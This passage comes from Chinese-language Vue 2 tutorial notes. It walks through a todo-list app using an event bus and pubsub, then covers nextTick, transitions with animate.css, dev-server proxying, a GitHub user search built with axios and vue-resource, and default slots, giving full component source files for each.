	render: h => h(App),
    beforeCreate(){
        //注册全局事件总线
        Vue.prototype.$bus = this;
    }
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <!-- <NullHeader :addTodoItem="addTodoItem" /> -->
        <!-- 使用自定义事件改写 -->
        <NullHeader @addTodoItem="addTodoItem" />
        <!--        
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        /> -->
        <!-- 使用全局事件总线来处理 -->
        <NullList :todos="todos" />

        <!-- <NullFooter
          :todos="todos"
          :checkAllOrNot="checkAllOrNot"
          :cleanFinish="cleanFinish"
        /> -->
        <!-- 使用自定义事件改写  -->
        <NullFooter
          :todos="todos"
          @checkAllOrNot="checkAllOrNot"
          @cleanFinish="cleanFinish"
        />
      </div>
    </div>
  </div>
</template>

<script>
import pubsub from 'pubsub-js'
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      //将数据存储至localStorage中
      todos: JSON.parse(localStorage.getItem("todos")) || [],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    //deleteTodoBox首个参数必须是msgName,或者可以写成_
    // deleteTodoBox(msgName,id) {
    deleteTodoBox(_,id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done) {
      this.todos.forEach((item) => {
        item.done = done;
      });
    },
    cleanFinish() {
      this.todos = this.todos.filter((item) => {
        return !item.done;
      });
    },
  },
  watch: {
    // 当检测到数据改变时，将数据进行保存至localStorage操作
    todos: {
      deep: true,
      handler(value) {
        localStorage.setItem("todos", JSON.stringify(value));
      },
    },
  },
  mounted(){
    //注册全局事件
    this.$bus.$on('checkedTodoBox',this.checkedTodoBox);
    //改为使用pubsub来实现
    //this.$bus.$on('deleteTodoBox',this.deleteTodoBox);
    this.pubId = pubsub.subscribe('deleteTodoBox',this.deleteTodoBox)
  },
  beforeDestroy(){
    //组件销毁时，解绑事件
    this.$bus.$off('checkedTodoBox');
    // this.$bus.$off('deleteTodoBox');
    pubsub.unsubscribe(this.pubId);
  }
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>

```

src\components\NullFooter.vue

```vue
<template>
  <!-- 使用数据集的大小，非0即为true -->
  <div class="todo-footer" v-show="countTotal">
    <label>
      <!-- <input type="checkbox" :checked="isAllChecked" @change="checkAll" /> -->
      <input type="checkbox" v-model="isAllChecked" />
    </label>
    <span>
      <span>已完成{{ countDoneNum }}</span> / 全部{{ countTotal }}
    </span>
    <button class="btn btn-danger" @click="cleanAll">清除已完成任务</button>
  </div>
</template>

<script>
export default {
  name: "NullFooter",
  //此时数据还是需要传递的，但方法无需再传递
  // props: ["todos", "checkAllOrNot","cleanFinish"],
  props: ["todos"],
  computed: {
    countTotal() {
      return this.todos.length;
    },
    countDoneNum: {
      get() {
        let num = 0;
        this.todos.forEach((item) => {
          if (item.done) {
            num++;
          }
        });

        return num;
      },
    },
    isAllChecked: {
      get() {
        return this.countTotal == this.countDoneNum && this.countTotal > 0;
      },
      //set在传递时，值就为true或者false，表示选择与未选择
      set(value) {
        //使用自定义事件调用
        // this.checkAllOrNot(value);
        this.$emit('checkAllOrNot', value);
      },
    },
  },
  methods: {
    // 此使用计算属性来实现更为便捷
    // checkAll(e)
    // {
    //   this.checkAllOrNot(e.target.checked);
    // }
    cleanAll() {
      //使用自定义事件来改写
      // this.cleanFinish();
      this.$emit('cleanFinish');
    },
  },
};
</script>

<style scoped>
/*footer*/
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}

.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>

```

src\components\NullHeader.vue

```vue
<template>
    <div class="todo-header">
        <input type="text" placeholder="请输入你的任务名称，按回车键确认" @keyup.enter="userInput"/>
    </div>
</template>

<script>
import {nanoid} from 'nanoid'

export default {
    name: 'NullHeader',
    //使用自定义事件无需再接收参数
    //props: ["addTodoItem"],
    methods: {
        userInput(event){
            //校验数据不能为空
            if(!event.target.value.trim())
            {
                alert('输入不能为空');
                return;
            }
            //将用户输入的信息包装成一个todo对象
            const todoObj = {id: nanoid(),title: event.target.value,done:false};
            //此时必须使用this，才是vc对象。调用receive方法
            //通过APP组件添加一个数据
            //此时不需要再调用添加方法，触发一个事件即可
            //this.addTodoItem(todoObj);
            this.$emit('addTodoItem',todoObj);
            //清空输入
            event.target.value = '';
        }
    }
}
</script>

<style scoped>
	/*header*/
	.todo-header input {
		width: 560px;
		height: 28px;
		font-size: 14px;
		border: 1px solid #ccc;
		border-radius: 4px;
		padding: 4px 7px;
	}

	.todo-header input:focus {
		outline: none;
		border-color: rgba(82, 168, 236, 0.8);
		box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 8px rgba(82, 168, 236, 0.6);
	}
</style>
```

src\components\NullList.vue

```vue
<template>
  <ul class="todo-main">
    <!-- <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
      :checkedTodoBox="checkedTodoBox"
	  :deleteTodoBox="deleteTodoBox"
    /> -->

    <!-- 使用事件总线后，无需传递 -->
    <NullItem
      v-for="todoItem in todos"
      :key="todoItem.id"
      :todoItem="todoItem"
    />
  </ul>
</template>

<script>
import NullItem from "./NullItem.vue";

export default {
  name: "NullFooter",
  components: { NullItem },
  //使用事件总线后，无需通过props传递
  // props: ["todos", "checkedTodoBox","deleteTodoBox"],
  props: ["todos"],
};
</script>

<style scoped>
/*main*/
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding: 0px;
}

.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 2px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>
```

src\components\NullItem.vue

```vue
<template>
  <li>
    <label>
      <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" />
	  <!-- 如下代码也能实现功能，但不推荐，违反了原则，因为修改了props中的值 -->
	  <!-- <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" /> -->
      <span>{{todoItem.title}}</span>
    </label>
    <button class="btn btn-danger" @click="deleteHandler(todoItem.id)">删除</button>
  </li>
</template>

<script>
import pubsub from 'pubsub-js'
export default {
  name: "NullItem",
  //声明接收传递过来的todoItem对象
  // props: ["todoItem","checkedTodoBox","deleteTodoBox"],
  //使用事件总线，无需传递
  props: ["todoItem"],
  methods:{
	checkHandler(id){
		//通知组件将对应的done值取反。
		// this.checkedTodoBox(id);
    //使用全局事件总线触发
    this.$bus.$emit('checkedTodoBox',id)
	},
	deleteHandler(id){
		if(confirm('确定删除数据吗?'))
		{
			//this.deleteTodoBox(id);
      //使用全局事件总线触发
      // this.$bus.$emit('deleteTodoBox',id);
      //使用pubsub来操作
      pubsub.publish('deleteTodoBox',id);
		}
	}
  }
};
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

/* 鼠标悬浮时进行显示。 */
li:hover button {
  display: block;
}
</style>
```

打开网页,操作先添加一个名称，再做删除

![image-20250120231800368](.\images\image-20250120231800368.png)



### 2.17 nextTick

本案例在totoList的删除使用发布订阅上继续

这里会添加一个功能，那就是编辑数据。



src\App.vue

```vue
<template>
  <div id="root">
    <div class="todo-container">
      <div class="todo-wrap">
        <!-- 将一个函数传递给子组件 -->
        <!-- <NullHeader :addTodoItem="addTodoItem" /> -->
        <!-- 使用自定义事件改写 -->
        <NullHeader @addTodoItem="addTodoItem" />
        <!--        
        <NullList
          :todos="todos"
          :checkedTodoBox="checkedTodoBox"
          :deleteTodoBox="deleteTodoBox"
        /> -->
        <!-- 使用全局事件总线来处理 -->
        <NullList :todos="todos" />

        <!-- <NullFooter
          :todos="todos"
          :checkAllOrNot="checkAllOrNot"
          :cleanFinish="cleanFinish"
        /> -->
        <!-- 使用自定义事件改写  -->
        <NullFooter
          :todos="todos"
          @checkAllOrNot="checkAllOrNot"
          @cleanFinish="cleanFinish"
        />
      </div>
    </div>
  </div>
</template>

<script>
import pubsub from "pubsub-js";
import NullHeader from "./components/NullHeader.vue";
import NullList from "./components/NullList.vue";
import NullFooter from "./components/NullFooter.vue";

export default {
  name: "App",
  components: { NullHeader, NullList, NullFooter },
  data() {
    return {
      //将数据存储至localStorage中
      todos: JSON.parse(localStorage.getItem("todos")) || [],
    };
  },
  methods: {
    addTodoItem(todoItem) {
      this.todos.unshift(todoItem);
    },
    checkedTodoBox(id) {
      console.log("调用了APP中的checkedTodoBox", id);
      this.todos.forEach((item) => {
        if (item.id === id) {
          item.done = !item.done;
        }
      });
    },
    //deleteTodoBox首个参数必须是msgName,或者可以写成_
    // deleteTodoBox(msgName,id) {
    deleteTodoBox(_, id) {
      this.todos = this.todos.filter((item) => {
        return item.id != id;
      });
    },
    checkAllOrNot(done) {
      this.todos.forEach((item) => {
        item.done = done;
      });
    },
    cleanFinish() {
      this.todos = this.todos.filter((item) => {
        return !item.done;
      });
    },
    //修改数据的方法
    updateTodo(id,title){
      console.log('收到了updateTodo')
      this.todos.forEach((todo)=>{
        if(todo.id === id){
          todo.title = title;
        }
      })
    }
  },
  watch: {
    // 当检测到数据改变时，将数据进行保存至localStorage操作
    todos: {
      deep: true,
      handler(value) {
        localStorage.setItem("todos", JSON.stringify(value));
      },
    },
  },
  mounted() {
    //注册全局事件
    this.$bus.$on("checkedTodoBox", this.checkedTodoBox);
    //改为使用pubsub来实现
    //this.$bus.$on('deleteTodoBox',this.deleteTodoBox);
    this.pubId = pubsub.subscribe("deleteTodoBox", this.deleteTodoBox);

    //给修改注册一个事件
    this.$bus.$on('updateTodo',this.updateTodo);
  },
  beforeDestroy() {
    //组件销毁时，解绑事件
    this.$bus.$off("checkedTodoBox");
    this.$bus.$off("updateTodo");
    // this.$bus.$off('deleteTodoBox');
    pubsub.unsubscribe(this.pubId);
  },
};
</script>

<style>
/*base*/
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
    0 1px 2px rgba(0, 0, 0, 0.05);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-edit {
  color: #fff;
  background-color: skyblue;
  border: 1px solid rgb(103, 159, 180);
  margin-right: 6px;
}

.btn-danger:hover {
  color: #fff;
  background-color: #bd362f;
}
.btn:focus {
  outline: none;
}
.todo-container {
  width: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>

```

src\components\NullItem.vue

```vue
<template>
  <li>
    <label>
      <input
        type="checkbox"
        :checked="todoItem.done"
        @change="checkHandler(todoItem.id)"
      />
      <!-- 如下代码也能实现功能，但不推荐，违反了原则，因为修改了props中的值 -->
      <!-- <input type="checkbox" :checked="todoItem.done" @change="checkHandler(todoItem.id)" /> -->
      <span v-show="!todoItem.isEdit">{{ todoItem.title }}</span>
      <!-- ref="inputTitle" 引用标识会生成一个引用的ID -->
      <input
        type="text"
        v-show="todoItem.isEdit"
        :value="todoItem.title"
        @blur="handleBlur(todoItem,$event)"
        @keyup.enter="handleBlur(todoItem,$event)"
        ref="inputTitle"
      />
    </label>
    <button class="btn btn-danger" @click="deleteHandler(todoItem.id)">
      删除
    </button>
    <button class="btn btn-edit" @click="editHandler(todoItem)">编辑</button>
  </li>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "NullItem",
  //声明接收传递过来的todoItem对象
  // props: ["todoItem","checkedTodoBox","deleteTodoBox"],
  //使用事件总线，无需传递
  props: ["todoItem"],
  methods: {
    checkHandler(id) {
      //通知组件将对应的done值取反。
      // this.checkedTodoBox(id);
      //使用全局事件总线触发
      this.$bus.$emit("checkedTodoBox", id);
    },
    deleteHandler(id) {
      if (confirm("确定删除数据吗?")) {
        //this.deleteTodoBox(id);
        //使用全局事件总线触发
        // this.$bus.$emit('deleteTodoBox',id);
        //使用pubsub来操作
        pubsub.publish("deleteTodoBox", id);
      }
    },
    // 编辑
    editHandler(todo) {
      //检查是否包含isEdit属性，如果当前包含，设置设置为可以编辑
      if (todo.hasOwnProperty("isEdit")) {
        todo.isEdit = true;
      } else {
        this.$set(todo, "isEdit", true);
      }
      this.$nextTick(function(){
        this.$refs.inputTitle.focus();
      })
    },
    //失去焦点回调，执行真正修改逻辑
    handleBlur(todoItem, event) {
      todoItem.isEdit = false;
      if (!event.target.value.trim()) {
        return alert("输入不能为空");
      }
      this.$bus.$emit('updateTodo',todoItem.id,event.target.value);
    },
  },
};
</script>

<style scoped>
/*item*/
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}

li label {
  float: left;
  cursor: pointer;
}

li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}

li button {
  float: right;
  display: none;
  margin-top: 3px;
}

li:before {
  content: initial;
}

li:last-child {
  border-bottom: none;
}

li:hover {
  background-color: #ddd;
}

/* 鼠标悬浮时进行显示。 */
li:hover button {
  display: block;
}
</style>
```



#### 总结nextTick

1. 语法：```this.$nextTick(回调函数)```
2. 作用：在下一次 DOM 更新结束后执行其指定的回调。
3. 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。



### 2.18 过度与动画

src\main.js

```html
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	},
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <Test />
    <hr />
    <Test2 />
    <hr />
    <hr />
    <Test3 />
  </div>
</template>

<script>
import Test from "./components/Test.vue";
import Test2 from "./components/Test2.vue";
import Test3 from "./components/Test3.vue";

export default {
  name: "App",
  components: { Test, Test2,Test3 },
};
</script>

```

src\components\Test.vue

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition name="nullnull" appear>
      <h1 v-show="isShow">你好啊</h1>
    </transition>
  </div>
</template>

<script>
export default {
  name: "Test",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: orange;
}
.nullnull-enter-active {
  animation: nullnull 0.5s linear;
}
.nullnull-leave-active {
  animation: nullnull 0.5s linear reverse;
}
@keyframes nullnull {
  from {
    transform: translateX(-100%);
  }
  to {
    transform: translateX(0px);
  }
}
</style>
```



src\components\Test2.vue

```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group name="nullnull" appear>
      <h1 v-show="isShow" key="1">你好啊</h1>
      <h1 v-show="!isShow" key="2">天黑了，睡觉</h1>
    </transition-group>
  </div>
</template>

<script>
export default {
  name: "Test",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: orange;
}

/* 进入的起点、离开的终点 */
.nullnull-enter,
.nullnull-leave-to {
  transform: translateX(-100%);
}
.nullnull-enter-active,
.nullnull-leave-active {
  transition: 0.5s linear;
}
/* 进入的终点、离开的起点 */
.nullnull-enter-to,
.nullnull-leave {
  transform: translateX(0);
}
</style>
```

src\components\Test3.vue

引入第三方样式

安装:

```sh
https://animate.style/


npm install animate.css --save

# 基础的样式名称
<h1 class="animate__animated animate__bounce">An animated element</h1>

# 导入样式
import 'animate.css';
```



```vue
<template>
  <div>
    <button @click="isShow = !isShow">显示/隐藏</button>
    <transition-group
      appear
      name="animate__animated animate__bounce"
      enter-active-class="animate__swing"
      leave-active-class="animate__backOutUp"
    >
      <h1 v-show="!isShow" key="1">你好啊</h1>
      <h1 v-show="isShow" key="2">nullnull</h1>
    </transition-group>
  </div>
</template>

<script>
import "animate.css";
export default {
  name: "Test",
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<style scoped>
h1 {
  background-color: orange;
}
</style>
```



![image-20250127125524634](./images\image-20250127125524634.png)



#### 总结：Vue封装的过度与动画

1. 作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。

2. 图示：

   ![image-20250127130254784](.\images\image-20250127130254784.png)

3. 写法：

   1. 准备好样式：

      - 元素进入的样式：
        1. v-enter：进入的起点
        2. v-enter-active：进入过程中
        3. v-enter-to：进入的终点
      - 元素离开的样式：
        1. v-leave：离开的起点
        2. v-leave-active：离开过程中
        3. v-leave-to：离开的终点

   2. 使用```<transition>```包裹要过度的元素，并配置name属性：

      ```vue
      <transition name="hello">
      	<h1 v-show="isShow">你好啊！</h1>
      </transition>
      ```

   3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

### 2.19 脚手架代理

为什么要配制代理？

简单实验

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	},
})
```

src\App.vue

```vue
<template>
  <div id="root">
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  methods:{
    getStudents(){
      axios.get('http://localhost:5000/students').then(
        response => {
          console.log('请求成功了:',response);
        },
        error=>{
          console.log('请求失败了:',error.message);
        }
      )
    }
  }
};
</script>
```

启动服务

![image-20250210214444473](.\images\image-20250210214444473.png)

发现浏览器提示跨域的问题。要解决这个问题，就可以使用VUE的代理

可能参考：

```sh
https://cli.vuejs.org/zh/config/#devserver-proxy
```



#### 1 代理方式1

vue.config.js

```js
module.exports = {
  pages: {
    index: {
      //入口
      entry: 'src/main.js',
    },
  },
  //关闭语法检查
  lintOnSave:false, 
  //配制代理服务器
  devServer: {
    proxy: 'http://localhost:5000'
  }
}
```

src\App.vue

```vue
<template>
  <div id="root">
    <button @click="getStudents">获取学生信息</button>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  methods:{
    getStudents(){
      //此处代理还是本地的端口
      axios.get('http://localhost:8080/students').then(
        response => {
          console.log('请求成功了:',response);
        },
        error=>{
          console.log('请求失败了:',error.message);
        }
      )
    }
  }
};
</script>

```

此时就能成功的请求到了。

![image-20250210215724843](.\images\image-20250210215724843.png)





#### 2 代理方式2

在代理方式1中仅可以进行简单的的一个全局代理，不够灵活，如果接口请求多个服务呢？那这时候，就需要使用更加完整的代理服务了

vue.config.js

```js
module.exports = {
  pages: {
    index: {
      //入口
      entry: 'src/main.js',
    },
  },
  //关闭语法检查
  lintOnSave: false,
  //配制代理服务器
  devServer: {
    proxy: {
      '/stu': {
        target: 'http://localhost:5000',
        //在请求服务器时去掉前缀
        pathRewrite:{'^/stu':''},
        ws: true,
        changeOrigin: true
      },
      '/cs': {
        target: 'http://localhost:5001',
        //在请求服务器时去掉前缀
        pathRewrite:{'^/cs':''},
        ws: true,
        changeOrigin: true
      }
    }
  }
}
```

src\App.vue

```vue
<template>
  <div id="root">
    <button @click="getStudents">获取学生信息</button>
    <button @click="getCars">获取汽车信息</button>
  </div>
</template>

<script>
import axios from "axios";

export default {
  name: "App",
  methods:{
    getStudents(){
      //此处代理还是本地的端口
      axios.get('http://localhost:8080/stu/students').then(
        response => {
          console.log('请求成功了:',response);
        },
        error=>{
          console.log('请求失败了:',error.message);
        }
      )
    },
    getCars(){
      axios.get('http://localhost:8080/cs/cars').then(
        response => {
          console.log('请求成功了',response.data);
        },
        error=>{
          console.log('请求失败了:',error.message);
        }
      )
    }
  }
};
</script>
```

启动服务

![image-20250210221207625](.\images\image-20250210221207625.png)

可以发现两个服务都能正常的进行访问操作。



### 2.20 github搜索

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div id="root">
      <Search/>
      <hr/>
      <List/>
  </div>
</template>

<script>
import axios from "axios";
import List from "./components/List";
import Search from "./components/Search";

export default {
  name: "App",
  components: { List, Search },
};
</script>

```

src\components\List.vue

```vue
<template>
  <div class="row" style="">
    <!-- 用户列表展示 -->
    <div
      class="card"
      v-show="users.length"
      v-for="user in users"
      :key="user.login"
    >
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <div class="loadcss">
      <!--欢迎词展示-->
      <h1 v-show="isFirst">欢迎使用</h1>
      <!--展示加载中-->
      <h1 v-show="isLoading">加载中</h1>
      <!--展示错误信息-->
      <h1 v-show="errorMsg">{{ errorMsg }}</h1>
    </div>
  </div>
</template>

<script>
export default {
  name: "List",
  data() {
    return {
      isFirst: true,
      isLoading: false,
      errorMsg: "",
      users: [],
    };
  },
  mounted() {
    this.$bus.$on("updateListData", (dataObj) => {
      this.isFirst = dataObj.isFirst;
      this.isLoading = dataObj.isLoading;
      this.errorMsg = dataObj.errorMsg;
      this.users = dataObj.users;
    });
  },
};
</script>

<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: 0.75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: 0.75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}

.loadcss {
  margin-left: 25px;
}
</style>
```



src\components\Search.vue

```vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        v-model="keyWord"
        placeholder="enter the name you search"
      />&nbsp;
      <button @click="searchUser">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";
export default {
  name: "Search",
  data() {
    return {
      keyWord: "",
    };
  },
  methods: {
    searchUser() {
        console.log('request key:',this.keyWord);
        this.$bus.$emit('updateListData',{isLoading:true,errorMsg:'',users:[],isFirst:false})
        //进行请求无程数据加载到列表中
        axios.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
            response => {
                console.log('请求成功了',response.data);
                this.$bus.$emit('updateListData',{isLoading:false,errorMsg:'',users:response.data.items,isFirst:false});
            },
            error=>{
                console.log('请求失败了',error);
                this.$bus.$emit('updateListData',{isLoading:false,errorMsg:error.message,users:[],isFirst:false});
            }
        )
    },
  },
};
</script>

<style>
</style>
```

启动服务

![image-20250211180503719](.\images\image-20250211180503719.png)

搜索中

![image-20250211180612938](.\images\image-20250211180612938.png)

加载图片

![image-20250211180645090](.\images\image-20250211180645090.png)



### 2.21 使用Vue-Resource发送Ajax

首先是安装

```sh
npm i vue-resource
```

使用插件

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
// 引入插件
import VueResource from 'vue-resource'
//关闭Vue的生产提示
Vue.config.productionTip = false

//使用插件 
Vue.use(VueResource)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div id="root">
      <Search/>
      <hr/>
      <List/>
  </div>
</template>

<script>
import axios from "axios";
import List from "./components/List";
import Search from "./components/Search";

export default {
  name: "App",
  components: { List, Search },
};
</script>
```

src\components\Search.vue

```vue
<template>
  <section class="jumbotron">
    <h3 class="jumbotron-heading">Search Github Users</h3>
    <div>
      <input
        type="text"
        v-model="keyWord"
        placeholder="enter the name you search"
      />&nbsp;
      <button @click="searchUser">Search</button>
    </div>
  </section>
</template>

<script>
import axios from "axios";
export default {
  name: "Search",
  data() {
    return {
      keyWord: "",
    };
  },
  methods: {
    searchUser() {
        console.log('this:',this);
        console.log('request key:',this.keyWord);
        this.$bus.$emit('updateListData',{isLoading:true,errorMsg:'',users:[],isFirst:false})
        //使用vue-resource请求无程数据加载到列表中
        this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
            response => {
                console.log('请求成功了',response.data);
                this.$bus.$emit('updateListData',{isLoading:false,errorMsg:'',users:response.data.items,isFirst:false});
            },
            error=>{
                console.log('请求失败了',error);
                this.$bus.$emit('updateListData',{isLoading:false,errorMsg:error.message,users:[],isFirst:false});
            }
        )
    },
  },
};
</script>

<style>
</style>
```

src\components\List.vue

```vue
<template>
  <div class="row" style="">
    <!-- 用户列表展示 -->
    <div
      class="card"
      v-show="users.length"
      v-for="user in users"
      :key="user.login"
    >
      <a :href="user.html_url" target="_blank">
        <img :src="user.avatar_url" style="width: 100px" />
      </a>
      <p class="card-text">{{ user.login }}</p>
    </div>
    <div class="loadcss">
      <!--欢迎词展示-->
      <h1 v-show="isFirst">欢迎使用</h1>
      <!--展示加载中-->
      <h1 v-show="isLoading">加载中</h1>
      <!--展示错误信息-->
      <h1 v-show="errorMsg">{{ errorMsg }}</h1>
    </div>
  </div>
</template>

<script>
export default {
  name: "List",
  data() {
    return {
      isFirst: true,
      isLoading: false,
      errorMsg: "",
      users: [],
    };
  },
  mounted() {
    this.$bus.$on("updateListData", (dataObj) => {
      this.isFirst = dataObj.isFirst;
      this.isLoading = dataObj.isLoading;
      this.errorMsg = dataObj.errorMsg;
      this.users = dataObj.users;
    });
  },
};
</script>

<style scoped>
.album {
  min-height: 50rem; /* Can be removed; just added for demo purposes */
  padding-top: 3rem;
  padding-bottom: 3rem;
  background-color: #f7f7f7;
}

.card {
  float: left;
  width: 33.333%;
  padding: 0.75rem;
  margin-bottom: 2rem;
  border: 1px solid #efefef;
  text-align: center;
}

.card > img {
  margin-bottom: 0.75rem;
  border-radius: 100px;
}

.card-text {
  font-size: 85%;
}

.loadcss {
  margin-left: 25px;
}
</style>
```

启动服务

![image-20250211202457052](.\images\image-20250211202457052.png)

通过观察当前可以发现，此vue-resource会绑定一个$http对象。通过此便可以发送Ajax请求。



### 2.22 插槽

#### 2.22.1 默认插槽

src\main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//关闭Vue的生产提示
Vue.config.productionTip = false

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	//创建事件总线
	beforeCreate() {
		Vue.prototype.$bus = this
	}
})
```

src\App.vue

```vue
<template>
  <div  class="container">
    <Category title="美食">
      <img src="https://avatars.githubusercontent.com/u/13393021?v=4" />
    </Category>

    <Category title="游戏">
      <ul>
        <li v-for="(g, index) in games" :key="index">{{ g }}</li>
      </ul>
    </Category>

    <Category title="电影">
      <video
        controls
        src="https://vdept3.bdstatic.com/mda-rbahmp4f4z4sdxc8/cae_h264/1739278704766346239/mda-rbahmp4f4z4sdxc8.mp4?v_from_s=hkapp-haokan-nanjing&auth_key=1739291096-0-0-63c487c7778033283310fe6c25c0e288&bcevod_channel=searchbox_feed&pd=1&cr=0&cd=0&pt=3&logid=1496735763&vid=6626823136837992546&klogid=1496735763&abtest=132219_1"
      ></video>
    </Category>
  </div>
</template>

<script>
import axios from "axios";
import Category from "./components/Category";

export default {
  name: "App",
  components: { Category },
  data() {
    return {
      foods: ["火锅", "烧烤", "小龙虾", "牛排"],
      games: ["红色警戒", "穿越火线", "劲舞团", "超级玛丽"],
      films: ["《变形金钢》", "《拆弹专家》", "《战狼》", "《哪吒》"],
    };
  },
};
</script>

<style scoped>
	.container{
		display: flex;
		justify-content: space-around;
	}
</style>

```

src\components\Category.vue

```vue
<template>
<div class="category">
  <h3>{{title}}</h3>
  <!-- 定义一个插槽，等着组件的使用进行填充 -->
  <slot>插槽默认值,没有为插槽指定数据时，此将显示</slot>
</div>
</template>

<script>
export default {
  name: "Category",
  props:["title"]
};
</script>

<style scoped>
	.category{
		background-color: skyblue;
		width: 200px;
		height: 300px;
	}
	h3{
		text-align: center;
		background-color: orange;
	}
	video{
		width: 100%;
	}
	img{
		width: 100%;
	}
</style>
```

启动服务

![image-20250211213104820](.\images\image-20250211213104820.png)



